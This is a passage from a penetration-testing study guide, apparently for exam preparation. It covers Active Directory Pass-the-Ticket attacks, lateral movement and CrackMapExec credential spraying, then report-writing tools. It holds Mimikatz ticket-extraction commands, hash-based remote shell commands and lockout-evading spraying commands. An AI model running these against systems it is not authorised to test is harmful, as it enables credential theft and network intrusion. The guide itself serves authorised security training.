</code></pre>
              <ul>
                <li>WinRM via HTTPS</li>
              </ul>
              <pre><code class="language-bash">crackmapexec winrm [IP] -u [VALID_USERNAME] -p [VALID_PASSWORD] --exec-method invoke_command
</code></pre>
              <ul>
                <li>Active Directory Web Services (ADWS): identify if ADWS is accessible:</li>
              </ul>
              <pre><code class="language-bash">ldapsearch -x -h [IP] -p 9389
</code></pre>
              <h4 id="13127-sample-outputs">13.12.7 Sample Outputs</h4>
              <ul>
                <li><strong><code>enum4linux</code></strong></li>
              </ul>
              <pre><code class="language-text">Domain Name: DOMAIN.LOCAL
Domain SID: S-1-5-21-123456789-1234567890-123456789
Users:
  [*] Administrator
  [*] Guest
</code></pre>
              <ul>
                <li><strong><code>CrackMapExec</code></strong> (Valid Credentials)</li>
              </ul>
              <pre><code class="language-text">192.168.123.10 - SMB         [*] domain.local\esolis:Password2024! (Pwned!)
</code></pre>
              <ul>
                <li><strong><code>ldapsearch</code></strong></li>
              </ul>
              <pre><code class="language-text">dn: CN=Emma Solis,OU=Users,DC=domain,DC=local
sAMAccountName: esolis
userPrincipalName: esolis@domain.local
</code></pre>

              <h3 id="1313-pass-the-ticket-ptt">13.13 Pass-the-Ticket (PtT)</h3>
              <p><strong>Pass-the-Ticket</strong> is a technique used by attackers to reuse a <strong>valid Kerberos
                  Ticket Granting
                  Ticket (TGT)</strong> from another user (often a privileged one) in order to authenticate across
                systems in the
                domain without needing the user's password or hash. It is commonly used in <strong>lateral
                  movement</strong> scenarios
                after compromising a host. Keep in mind that TGTs have a limited lifetime so use them before they
                expire.</p>
              <table class="custom-table">
                <thead>
                  <tr>
                    <th>Requirement</th>
                    <th>Description</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td><strong>Active TGT in Memory</strong></td>
                    <td>A valid TGT from a privileged user must be present, for example that it was cached by a Domain Admin that logged in before.</td>
                  </tr>
                  <tr>
                    <td><strong>SYSTEM Privileges</strong></td>
                    <td>Needed to access LSASS memory where Kerberos tickets are stored.</td>
                  </tr>
                  <tr>
                    <td><strong>Local Administrator</strong></td>
                    <td>Often sufficient, as it allows escalation to SYSTEM or LSASS access tools.</td>
                  </tr>
                </tbody>
              </table>
              <p><strong>How It Works</strong>:</p>
              <ol>
                <li><strong>Kerberos Authentication Flow</strong>: When a user authenticates, a TGT is issued by the Key
                  Distribution
                  Center (KDC) and stored in memory.</li>
                <li><strong>Ticket Extraction</strong>: If an attacker has SYSTEM access to a machine, they can extract
                  the TGT of any
                  user currently logged in using tools like Mimikatz.</li>
                <li><strong>Ticket Injection</strong>: The attacker can inject the stolen TGT into their own session to
                  impersonate
                  that user without needing their credentials.</li>
                <li><strong>Lateral Movement</strong>: With the TGT in memory, the attacker can access other systems and
                  services as
                  the compromised user, including Domain Controllers.</li>
              </ol>
              <p><strong>Steps to Perform a Pass-the-Ticket Attack</strong>:</p>
              <ol>
                <li>
                  <p><strong>Gain SYSTEM Access on a Compromised Machine</strong>:<br> You need SYSTEM privileges to
                    extract tickets
                    from memory using Mimikatz or similar tools.</p>
                </li>
                <li>
                  <p><strong>Extract Kerberos Tickets Using Mimikatz</strong>:</p>
                </li>
              </ol>
              <pre><code class="language-powershell">mimikatz
privilege::debug
sekurlsa::tickets
</code></pre>
              <ol start="3">
                <li><strong>Export the TGT to a File</strong>:</li>
              </ol>
              <pre><code class="language-powershell"># This will save .kirbi files to disk. Identify the correct TGT based on the user and encryption type.
sekurlsa::tickets /export
</code></pre>
              <ol start="4">
                <li><strong>Inject the TGT into Your Session</strong>:</li>
              </ol>
              <pre><code class="language-powershell">kerberos::ptt C:\path\to\admin_ticket.kirbi
</code></pre>
              <ol start="5">
                <li><strong>Verify the Injected Ticket</strong>:</li>
              </ol>
              <pre><code class="language-powershell">klist
</code></pre>
              <ol start="6">
                <li><strong>Perform Lateral Movement with the Injected Identity Perform Lateral Movement with the Injected Identity (in this case is getting RCE to another system but it can be accessing any other privileged resource)</strong>:</li>
              </ol>
              <pre><code class="language-powershell"># From Windows

# Using VMI
wmic /node:[target_host] process call create &quot;cmd.exe&quot;

# Using PsExec - SysInternal (May still require plaintext creds unless SMB session picks up Kerberos ticket)
PsExec.exe \\[target_host] -u [domain]\[username] cmd.exe

# Using WinRM (PowerShell Remoting)
Enter-PSSession -ComputerName [target_host] -Authentication Kerberos -Credential [domain]\[username]

# RDP: use mstsc (Remote Desktop), if TGT is injected correctly and domain trust allows it, you won‚Äôt be prompted for a password.
</code></pre>
              <pre><code class="language-bash"># From Kali

# Transfer the .kirbi to your Kali machine (use techniques from Section 17), and then convert the .kirbi ticket
kirbi2ccache [ticket_file].kirbi &gt; [ticket_file].ccache
export KRB5CCNAME=./[ticket_file].ccache

# Using PsExec
psexec.py -k -no-pass [domain]/[username]@[target_host]

# Using Evil-WinRM
evil-winrm -k -no-pass -u [username] -d [domain] -i [target_host]
</code></pre>

              <h2 id="14-active-directory-lateral-movement">14. <span class="emoji">‚ÜîÔ∏è</span> Active Directory Lateral
                Movement</h2>
              <h3 id="141-techniques-and-preparation">14.1 Techniques and Preparation</h3>
              <ul>
                <li><strong>PowerShell Execution Policy Bypass</strong>:</li>
              </ul>
              <pre><code class="language-powershell">powershell -ExecutionPolicy Bypass -File [script].ps1
</code></pre>
              <ul>
                <li>
                  <p><strong>Having valid credentials</strong>: in this case we can use any tools from either Windows or
                    Kali to connect to the system from an internal server, keep in mind the other possibilities of
                    impersonations using <strong>Silver and Golden Tickets</strong>, they are very important and are in
                    the Section 13, as well as <strong>password spraying</strong> with <code>crackmapexec</code> from
                    the
                    Section 6.2 and accessing the <strong>Shadow Copies</strong> (Section 13.10).</p>
                </li>
                <li>
                  <p><strong>Pass-the-Ticket</strong>: we use a Kerberos ticket to impersonate users, this is done using
                    Silver or Golden Tickets, for that check the Sections 13.3(Silver Ticket) and 13.4 (Golden Ticket).
                  </p>
                </li>
                <li>
                  <p><strong>Overpass-the-Hash</strong>: uses an NTLM hash to request a Kerberos ticket (TGT), allowing
                    attacks like pass-the-ticket.</p>
                </li>
              </ul>
              <pre><code class="language-powershell">mimikatz # sekurlsa::pth /user:&lt;username&gt; /domain:&lt;domain&gt; /ntlm:&lt;NTLM_hash&gt; /run:powershell

# You can then execute commands in the PowerShell session as if you were logged in as the other user, for example here we are moving to another system as the other user and running a shell:
.\PsExec.exe \\&lt;target_system&gt; cmd
</code></pre>
              <h3 id="142-from-kali">14.2 From Kali</h3>
              <h4 id="1421-evil-winrm">14.2.1 Evil-WinRM</h4>
              <ul>
                <li><strong>Password</strong>:</li>
              </ul>
              <pre><code class="language-bash">evil-winrm -u &lt;username&gt; -p &lt;password&gt; -i &lt;target_ip&gt;
</code></pre>
              <ul>
                <li><strong>NTLM Hash</strong>:</li>
              </ul>
              <pre><code class="language-bash"># Use -S option to ignore SSL validation for insecure systems.
evil-winrm -i &lt;target_ip&gt; -u &lt;username&gt; -H &lt;LM_hash&gt;:&lt;NTLM_hash&gt;
# or
evil-winrm -i &lt;target_ip&gt; -u &lt;username&gt; -H 00000000000000000000000000000000:&lt;NTLM_hash&gt;
</code></pre>
              <h4 id="1422-psexec">14.2.2 PsExec</h4>
              <ul>
                <li><strong>Password</strong>:</li>
              </ul>
              <pre><code class="language-bash">impacket-psexec &lt;username&gt;:&lt;password&gt;@&lt;target_ip&gt;
</code></pre>
              <ul>
                <li><strong>NTLM Hash</strong>:</li>
              </ul>
              <pre><code class="language-bash">impacket-psexec &lt;username&gt;@&lt;target_ip&gt; -hashes &lt;LM_hash&gt;:&lt;NTLM_hash&gt;
# or
impacket-psexec &lt;username&gt;@&lt;target_ip&gt; -hashes 00000000000000000000000000000000:&lt;NTLM_hash&gt;
</code></pre>
              <h4 id="1423-vmiexec">14.2.3 VMIExec</h4>
              <ul>
                <li><strong>Password</strong>:</li>
              </ul>
              <pre><code class="language-bash">impacket-wmiexec &lt;username&gt;:&lt;password&gt;@&lt;target_ip&gt;
</code></pre>
              <ul>
                <li><strong>NTLM Hash</strong>:</li>
              </ul>
              <pre><code class="language-bash">impacket-wmiexec -hashes &lt;LM_hash&gt;:&lt;NTLM_hash&gt; &lt;username&gt;@&lt;target_ip&gt;
# or
impacket-wmiexec -hashes 00000000000000000000000000000000:&lt;NTLM_hash&gt; &lt;username&gt;@&lt;target_ip&gt;
</code></pre>
              <h3 id="143-from-windows">14.3 From Windows</h3>
              <h4 id="1431-dcom-distributed-component-object-model">14.3.1 DCOM (Distributed Component Object Model)
              </h4>
              <p>This technique uses PowerShell&#39;s built-in capabilities to execute commands on remote systems via
                DCOM.</p>
              <ol>
                <li><strong>Verify if DCOM is enabled</strong> on the target machine.</li>
              </ol>
              <pre><code class="language-powershell">Get-ItemProperty -Path &quot;HKLM:\Software\Microsoft\OLE&quot; -Name &quot;DCOMServer&quot;
</code></pre>
              <ol start="2">
                <li><strong>Use the <code>Invoke-Command</code></strong> to Execute Commands via DCOM</li>
              </ol>
              <pre><code class="language-powershell">$targetIP = &quot;&lt;target_ip&gt;&quot;  # Replace with the actual target IP
$username = &quot;&lt;username&gt;&quot;    # Replace with the actual username
$password = &quot;&lt;password&gt;&quot;     # Replace with the actual password
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential($username, $secureString)

Invoke-Command -ComputerName $targetIP -Credential $credential -ScriptBlock { ipconfig }
</code></pre>
              <ol start="3">
                <li>(Optional) We can also try to use DCOM via <code>vmiexec</code></li>
              </ol>
              <pre><code class="language-bash">wmiexec.py &lt;domain&gt;/&lt;username&gt;:&lt;password&gt;@&lt;target_ip&gt;
# or
wmiexec.py &lt;domain&gt;/&lt;username&gt;@&lt;target_ip&gt; -hashes &lt;LM_hash&gt;:&lt;NTLM_hash&gt;
</code></pre>
              <h4 id="1432-psexec">14.3.2 PsExec</h4>
              <p>Tool for executing processes on remote systems, particularly useful for obtaining interactive shells.
              </p>
              <pre><code class="language-bash">psexec.exe \\&lt;target_ip&gt; -u &lt;username&gt; -p &lt;password&gt; cmd
</code></pre>
              <h4 id="1433-winrm">14.3.3 WinRM</h4>
              <p>Service that allows remote management of Windows systems through the WS-Management protocol; this is
                how
                to establish a remote session:</p>
              <pre><code class="language-powershell">$username = &#39;&lt;username&gt;&#39;;
$password = &#39;&lt;password&gt;&#39;;
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName &lt;target_ip&gt; -Credential $credential;
</code></pre>
              <h4 id="1434-winrs">14.3.4 WinRS</h4>
              <p>Command-line tool that allows you to run commands on remote systems.</p>
              <pre><code class="language-powershell">winrs -r:&lt;target_ip&gt; -u:&lt;username&gt; -p:&lt;password&gt; &quot;&lt;command&gt;&quot;
</code></pre>
              <h4 id="1435-wmic">14.3.5 WMIC</h4>
              <p>Command-line tool to perform Windows Management Instrumentation (WMI) operations, including executing
                commands remotely.</p>
              <pre><code class="language-powershell">wmic /node:&lt;target_ip&gt; /user:&lt;username&gt; /password:&lt;password&gt; process call create &quot;&lt;command&gt;&quot;
</code></pre>
              <h3 id="144-credential-spraying-with-crackmapexec">14.4 Credential Spraying with CrackMapExec</h3>
              <p><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec GitHub</a></p>
              <h4 id="1441-tips-for-credential-spraying">14.4.1 Tips for Credential Spraying</h4>
              <ol>
                <li><strong>Understand Domain Lockout Policies</strong>: use the <code>--delay</code> option in
                  CrackMapExec to prevent account lockouts; or limit retries with <code>--max-retries</code>.</li>
              </ol>
              <pre><code class="language-bash"># Check policies with a tool like rpcclient
rpcclient -U &quot;&quot; &lt;DOMAIN_IP&gt; -c &quot;getdompwinfo&quot;

# Test multiple passwords with a delay to avoid lockouts
crackmapexec smb &lt;DOMAIN_IP&gt; -d &lt;DOMAIN_NAME&gt; -u users.txt -p passwords.txt --spray --delay 5

# Test multiple passwords with a max retries limit to avoid lockouts
crackmapexec smb &lt;TARGET_IP&gt; -u users.txt -p passwords.txt --max-retries 3
</code></pre>
              <ol start="2">
                <li><strong>Focus on Subdomains and Trust Relationships</strong>: subdomains often contain poorly
                  secured credentials.</li>
              </ol>
              <pre><code class="language-bash"># Use CrackMapExec&#39;s --target option to narrow focus
crackmapexec smb &lt;TARGET_IP&gt; --target-ips subdomains.txt -u users.txt -p passwords.txt
</code></pre>
              <ol start="3">
                <li>
                  <p><strong>Test Outside the Domain</strong>: local accounts may be less monitored and prone to reuse
                    of weak credentials; Use the <strong><code>--local-auth</code></strong> option to explicitly test
                    these accounts.</p>
                </li>
                <li>
                  <p><strong>Log All Results</strong>: save the output to a file for review.</p>
                </li>
              </ol>
              <pre><code class="language-bash">crackmapexec smb &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN_NAME&gt; &gt; output.log
</code></pre>
              <ol start="5">
                <li>
                  <p><strong>Combine Results</strong>: aggregate data from <code>enum4linux</code> and
                    <code>crackmapexec</code> to identify:
                  </p>
                  <ul>
                    <li>Valid accounts.</li>
                    <li>Misconfigured shares.</li>
                    <li>Administrative access.</li>
                  </ul>
                </li>
                <li>
                  <p><strong>Target Multiple Domains Simultaneously</strong>: use domain-specific controllers or
                    services to test efficiently; for this you can use a list of the targets.</p>
                </li>
              </ol>
              <pre><code class="language-bash">crackmapexec smb &lt;IP_list&gt;.txt -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN_NAME&gt;
</code></pre>
              <ol start="7">
                <li>
                  <p><strong>Rotate Credentials Across Protocols</strong>:
                    Leverage credentials found via LDAP, SMB, or other protocols to test MSSQL, WinRM, etc.</p>
                </li>
                <li>
                  <p><strong>Combine Protocols for Pivoting</strong>: for example:</p>
                  <ol>
                    <li><strong>Enumerate users via LDAP</strong>:
                      <code>crackmapexec ldap &lt;DOMAIN_CONTROLLER_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --users</code>
                    </li>
                    <li><strong>Test RDP with those users</strong>:
                      <code>crackmapexec rdp &lt;TARGET_IP&gt; -u users.txt -p &lt;PASSWORD&gt;</code>
                    </li>
                  </ol>
                </li>
                <li>
                  <p><strong>Prioritize Testing of Domain Controllers</strong>: main domain controllers contain
                    centralized credentials and policies.</p>
                </li>
                <li>
                  <p><strong>Check Open Ports First</strong>: use Nmap or other tools to confirm protocol availability:
                  </p>
                </li>
              </ol>
              <pre><code class="language-bash">nmap -p 5985,1433,445,3389 &lt;TARGET_IP&gt;
</code></pre>
              <ol start="11">
                <li>
                  <p><strong>Combine Protocols</strong>: use credentials found in one protocol (e.g., LDAP) to attack
                    another (e.g., SMB, MSSQL).</p>
                </li>
                <li>
                  <p><strong>Pivot and Chain</strong>: CrackMapExec outputs can guide further attacks on
                    systems/services in the network.</p>
                </li>
                <li>
                  <p><strong>Test Both Passwords and Hashes</strong>: use the <code>-p</code> and <code>-H</code>
                    options together to maximize coverage during testing.</p>
                </li>
                <li>
                  <p><strong>COMBINE PASSWORDS AND HASHES TESTING</strong></p>
                </li>
              </ol>
              <pre><code class="language-bash"># Test both passwords and NTLM hashes
crackmapexec smb &lt;DOMAIN_IP&gt; -u users.txt -p passwords.txt -H hashes.txt -d &lt;DOMAIN_NAME&gt;
</code></pre>
              <h4 id="1442-smb">14.4.2 SMB</h4>
              <p>Against <strong>Main Domain</strong></p>
              <pre><code class="language-bash"># Test a single password across all users in the domain
crackmapexec smb &lt;DOMAIN_IP&gt; -d &lt;DOMAIN_NAME&gt; -u users.txt -p &lt;PASSWORD&gt; --spray --delay 5

# Test multiple passwords with a delay to avoid lockouts
crackmapexec smb &lt;DOMAIN_IP&gt; -d &lt;DOMAIN_NAME&gt; -u users.txt -p passwords.txt --spray --delay 5
</code></pre>
              <p>Against <strong>Subdomains</strong></p>
              <pre><code class="language-bash"># Enumerate subdomains with valid credentials and test credentials (for example a workstation specific domain, like workstation1.domain.com)
crackmapexec smb &lt;SUBDOMAIN_IP&gt; -d &lt;SUBDOMAIN_NAME&gt; -u users.txt -p &lt;PASSWORD&gt;
</code></pre>
              <p>Against <strong>Local Accounts</strong></p>
              <pre><code class="language-bash"># Test credentials against local accounts not part of the domain
crackmapexec smb &lt;IP&gt; -u local_users.txt -p &lt;PASSWORD&gt; --local-auth
</code></pre>
              <p><strong>Command Execution</strong></p>
              <pre><code class="language-bash"># Execute a command on a remote machine with valid credentials
crackmapexec smb &lt;DOMAIN_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN_NAME&gt; -x &quot;whoami&quot;

# Using NTLM hash
crackmapexec smb &lt;DOMAIN_IP&gt; -u &lt;USERNAME&gt; -H &lt;NTLM_HASH&gt; -d &lt;DOMAIN_NAME&gt; -x &quot;whoami&quot;
</code></pre>
              <h4 id="1443-winrm-windows-remote-management">14.4.3 WinRM (Windows Remote Management)</h4>
              <p>Against <strong>Main Domain</strong></p>
              <pre><code class="language-bash"># Test credentials on the main domain via WinRM
crackmapexec winrm &lt;DOMAIN_CONTROLLER_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN_NAME&gt; --spray --delay 5

# Test NTLM hash
crackmapexec winrm &lt;DOMAIN_CONTROLLER_IP&gt; -u &lt;USERNAME&gt; -H &lt;NTLM_HASH&gt; -d &lt;DOMAIN_NAME&gt; --spray --delay 5

# Execute a command
crackmapexec winrm &lt;DOMAIN_CONTROLLER_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN_NAME&gt; -x &quot;whoami&quot;
</code></pre>
              <p>Against <strong>Subdomains</strong></p>
              <pre><code class="language-bash"># Enumerate subdomains with valid credentials and test credentials (for example a workstation specific domain, like workstation1.domain.com). Authenticate on a subdomain
crackmapexec winrm &lt;SUBDOMAIN_CONTROLLER_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;SUBDOMAIN_NAME&gt;

# Using NTLM hash
crackmapexec winrm &lt;SUBDOMAIN_CONTROLLER_IP&gt; -u &lt;USERNAME&gt; -H &lt;NTLM_HASH&gt; -d &lt;SUBDOMAIN_NAME&gt;
</code></pre>
              <p>Against <strong>Local Accounts (Not Part of the Domain)</strong></p>
              <pre><code class="language-bash"># Authenticate with a local user account
crackmapexec winrm &lt;TARGET_IP&gt; -u &lt;LOCAL_USER&gt; -p &lt;PASSWORD&gt; --local-auth

# Using NTLM hash
crackmapexec winrm &lt;TARGET_IP&gt; -u &lt;LOCAL_USER&gt; -H &lt;NTLM_HASH&gt; --local-auth
</code></pre>
              <p><strong>Command Execution</strong></p>
              <pre><code class="language-bash"># Execute a command remotely
crackmapexec winrm &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN_NAME&gt; -x &quot;ipconfig&quot;

# Using an NTLM hash
crackmapexec winrm &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -H &lt;NTLM_HASH&gt; -d &lt;DOMAIN_NAME&gt; -x &quot;ipconfig&quot;
</code></pre>
              <h4 id="1444-psexec-smb-based-lateral-movement">14.4.4 PsExec (SMB-Based Lateral Movement)</h4>
              <p>Gaining a <strong>Shell</strong></p>
              <pre><code class="language-bash"># Gain a shell using valid credentials
crackmapexec smb &lt;DOMAIN_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN_NAME&gt; --exec-method smbexec

# Gain a shell using NTLM hash
crackmapexec smb &lt;DOMAIN_IP&gt; -u &lt;USERNAME&gt; -H &lt;NTLM_HASH&gt; -d &lt;DOMAIN_NAME&gt; --exec-method smbexec
</code></pre>
              <p><strong>Command Execution</strong></p>
              <pre><code class="language-bash"># Execute a remote command
crackmapexec smb &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN_NAME&gt; -x &quot;whoami&quot;

# Using an NTLM hash
crackmapexec smb &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -H &lt;NTLM_HASH&gt; -d &lt;DOMAIN_NAME&gt; -x &quot;whoami&quot;
</code></pre>
              <h4 id="1445-vmiexec">14.4.5 VMIExec</h4>
              <p>Gaining a <strong>Shell</strong></p>
              <pre><code class="language-bash"># Gain a shell using valid credentials
crackmapexec smb &lt;DOMAIN_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN_NAME&gt; --exec-method wmiexec

# Gain a shell using NTLM hash
crackmapexec smb &lt;DOMAIN_IP&gt; -u &lt;USERNAME&gt; -H &lt;NTLM_HASH&gt; -d &lt;DOMAIN_NAME&gt; --exec-method wmiexec
</code></pre>
              <h4 id="1446-ldap-lightweight-directory-access-protocol">14.4.6 LDAP (Lightweight Directory Access
                Protocol)</h4>
              <p>Against <strong>Main Domain</strong></p>
              <pre><code class="language-bash"># Authenticate and enumerate users on the main domain
crackmapexec ldap &lt;DOMAIN_CONTROLLER_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN_NAME&gt;

# Using NTLM hash
crackmapexec ldap &lt;DOMAIN_CONTROLLER_IP&gt; -u &lt;USERNAME&gt; -H &lt;NTLM_HASH&gt; -d &lt;DOMAIN_NAME&gt;
</code></pre>
              <p>Against <strong>Subdomains</strong></p>
              <pre><code class="language-bash"># Enumerate users on a subdomain
crackmapexec ldap &lt;SUBDOMAIN_CONTROLLER_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;SUBDOMAIN_NAME&gt;

# Using NTLM hash
crackmapexec ldap &lt;SUBDOMAIN_CONTROLLER_IP&gt; -u &lt;USERNAME&gt; -H &lt;NTLM_HASH&gt; -d &lt;SUBDOMAIN_NAME&gt;
</code></pre>
              <h4 id="1447-mssql-microsoft-sql-server">14.4.7 MSSQL (Microsoft SQL Server)</h4>
              <p>Against <strong>Main Domain</strong></p>
              <pre><code class="language-bash"># Test main domain credentials on an MSSQL server
crackmapexec mssql &lt;DOMAIN_CONTROLLER_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN_NAME&gt;

# Using NTLM hash
crackmapexec mssql &lt;DOMAIN_CONTROLLER_IP&gt; -u &lt;USERNAME&gt; -H &lt;NTLM_HASH&gt; -d &lt;DOMAIN_NAME&gt;
</code></pre>
              <p>Against <strong>Subdomains</strong></p>
              <pre><code class="language-bash"># Test credentials on a subdomain MSSQL server
crackmapexec mssql &lt;SUBDOMAIN_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;SUBDOMAIN_NAME&gt;

# Using NTLM hash
crackmapexec mssql &lt;SUBDOMAIN_IP&gt; -u &lt;USERNAME&gt; -H &lt;NTLM_HASH&gt; -d &lt;SUBDOMAIN_NAME&gt;
</code></pre>
              <p>Against <strong>Local Accounts (Not Part of the Domain)</strong></p>
              <pre><code class="language-bash"># Test local user credentials on MSSQL
crackmapexec mssql &lt;TARGET_IP&gt; -u &lt;LOCAL_USER&gt; -p &lt;PASSWORD&gt; --local-auth

# Using NTLM hash
crackmapexec mssql &lt;TARGET_IP&gt; -u &lt;LOCAL_USER&gt; -H &lt;NTLM_HASH&gt; --local-auth
</code></pre>
              <h4 id="1448-rdp">14.4.8 RDP</h4>
              <p>Against <strong>Main Domain</strong></p>
              <pre><code class="language-bash"># Test credentials against an RDP service on the main domain
crackmapexec rdp &lt;DOMAIN_CONTROLLER_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN_NAME&gt;

# Using NTLM hash
crackmapexec rdp &lt;DOMAIN_CONTROLLER_IP&gt; -u &lt;USERNAME&gt; -H &lt;NTLM_HASH&gt; -d &lt;DOMAIN_NAME&gt;
</code></pre>
              <p>Against <strong>Subdomains</strong></p>
              <pre><code class="language-bash"># Test credentials on an RDP service in a subdomain
crackmapexec rdp &lt;SUBDOMAIN_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;SUBDOMAIN_NAME&gt;

# Using NTLM hash
crackmapexec rdp &lt;SUBDOMAIN_IP&gt; -u &lt;USERNAME&gt; -H &lt;NTLM_HASH&gt; -d &lt;SUBDOMAIN_NAME&gt;
</code></pre>
              <p>Against <strong>Local Accounts (Not Part of the Domain)</strong></p>
              <pre><code class="language-bash"># Authenticate to RDP with local credentials
crackmapexec rdp &lt;TARGET_IP&gt; -u &lt;LOCAL_USER&gt; -p &lt;PASSWORD&gt; --local-auth

# Using NTLM hash
crackmapexec rdp &lt;TARGET_IP&gt; -u &lt;LOCAL_USER&gt; -H &lt;NTLM_HASH&gt; --local-auth
</code></pre>
              <h4 id="1449-ftp">14.4.9 FTP</h4>
              <p>For brute-forcing or enumerating FTP services.</p>
              <pre><code class="language-bash">crackmapexec ftp &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt;
</code></pre>
              <h4 id="14410-ssh">14.4.10 SSH</h4>
              <p>To authenticate against SSH servers.</p>
              <pre><code class="language-bash">crackmapexec ssh &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt;
</code></pre>
              <h4 id="14411-http">14.4.11 HTTP</h4>
              <p>To test and enumerate HTTP-based services.</p>
              <pre><code class="language-bash">crackmapexec http &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt;
</code></pre>

              <h2 id="15-cloud-infrastructures">15. <span class="emoji">‚òÅÔ∏è</span> Cloud Infrastructures</h2>
              <p>This section is still pending but rest assured since it is still not part of the exam.</p>

              <h2 id="16-reports-writing">16. <span class="emoji">üìù</span> Reports Writing</h2>
              <h3 id="161-tools-for-note-taking-and-report-writing">16.1 Tools for Note-Taking and Report Writing</h3>
              <h4 id="1611-recommended-tools">16.1.1 Recommended Tools</h4>
              <p>For additional note-taking tools tailored for hackers, visit this <a
                  href="https://github.com/nil0x42/awesome-hacker-note-taking">GitHub collection</a>.</p>
              <ul>
                <li><strong>Sublime Text</strong> - A powerful and customizable text editor for writing and formatting
                  reports with syntax highlighting.</li>
                <li><strong>CherryTree</strong> - A hierarchical note-taking application supporting rich text, syntax
                  highlighting, and organization of findings during assessments.</li>
                <li><strong>Obsidian</strong> - Markdown-based note-taking software with extensive plugin support for
                  detailed, linked documentation.</li>
                <li><strong>Flameshot</strong> - A versatile screenshot tool with annotation features, useful for
                  documenting findings efficiently.</li>
                <li><strong>Joplin</strong> - An open-source note-taking and to-do application with end-to-end
                  encryption,
                  suitable for writing and syncing penetration test notes across devices.</li>
                <li><strong>KeepNote</strong> - Designed for penetration testers, this app helps organize findings in a
                  structured tree format.</li>
                <li><strong>LaTeX</strong> - Perfect for creating highly customizable, professional report layouts,
                  especially for technical documentation.</li>
                <li><strong>MS Word / Google Docs</strong> - Common collaborative tools with customizable templates.
                </li>
              </ul>
              <h4 id="1612-best-practices">16.1.2 Best Practices</h4>
              <ul>
                <li><strong>Organize Findings</strong> - Categorize findings using folders or tags by severity (e.g.,
                  Critical, High, Medium, Low).</li>
                <li><strong>Use Markdown</strong> - Write reports in Markdown (e.g., Sublime, Obsidian) for easy
                  conversion to other formats such as HTML or PDF.</li>
                <li><strong>Version Control</strong> - Use Git or similar tools to track changes and maintain a history
                  of
                  report drafts.</li>
                <li><strong>Standardized Templates</strong> - Create reusable templates for different types of
                  assessments
                  (e.g., web app testing, network pentests) for consistency.</li>
              </ul>
              <h3 id="162-capturing-screenshots">16.2 Capturing Screenshots</h3>
              <h4 id="1621-windows">16.2.1 Windows</h4>
              <ul>
                <li><strong>Snipping Tool</strong> - Quickly accessed via <strong>Windows Key + Shift + S</strong> for
                  rectangular, free-form, window, and full-screen snips.</li>
                <li><strong>Snagit</strong> - Advanced tool for screenshots and screen recording, offering annotations,
                  callouts, and sharing features.</li>
              </ul>
              <h4 id="1622-macos">16.2.2 MacOS</h4>
              <ul>
                <li><strong>Built-in Screenshot Tool</strong>:<ul>
                    <li><strong>Command + Shift + 3</strong>: Full-screen capture.</li>
                    <li><strong>Command + Shift + 4</strong>: Capture selected area.</li>
                    <li><strong>Command + Shift + 5</strong>: Access screen capture options for screenshots and
                      recordings.</li>
                  </ul>
                </li>
                <li><strong>Preview Annotations</strong> - Use the Preview app to annotate screenshots by adding
                  highlights or text.</li>
              </ul>
              <h4 id="1623-kali-linux">16.2.3 Kali Linux</h4>
              <ul>
                <li><strong>Built-in Screenshot Tool</strong>:<ul>
                    <li>Run <code>gnome-screenshot</code> or search for &quot;Screenshot&quot; in the application menu.
                    </li>
                    <li>Options for entire screen, specific windows, or selected areas.</li>
                  </ul>
                </li>
              </ul>
              <h4 id="1624-cross-platform-tools">16.2.4 Cross-Platform Tools</h4>
              <ul>
                <li><strong>Flameshot</strong>:<ul>
                    <li>Available on Windows, MacOS, and Linux.</li>
                    <li>Includes features like annotations, blurring sensitive data, and direct uploads.</li>
                  </ul>
                </li>
                <li><strong>Shutter</strong> (Linux):<ul>
                    <li>A rich-featured tool for editing, managing, and uploading screenshots.</li>
                  </ul>
                </li>
              </ul>
              <h4 id="1625-best-practices-for-screenshots">16.2.5 Best Practices for Screenshots</h4>
              <ul>
                <li><strong>Annotate Findings</strong> - Use arrows, highlights, and text to clarify key issues or
                  vulnerabilities.</li>
                <li><strong>Consistent Naming</strong> - Use descriptive, consistent file names (e.g.,
                  <code>sql_injection_vuln_example.png</code>).
                </li>
                <li><strong>Optimize Image Size</strong> - Compress images for PDF reports while maintaining clarity.
                </li>
              </ul>
              <h3 id="163-key-components-of-a-good-report">16.3 Key Components of a Good Report</h3>
              <p>Components of an effective penetration test report:</p>
              <ul>
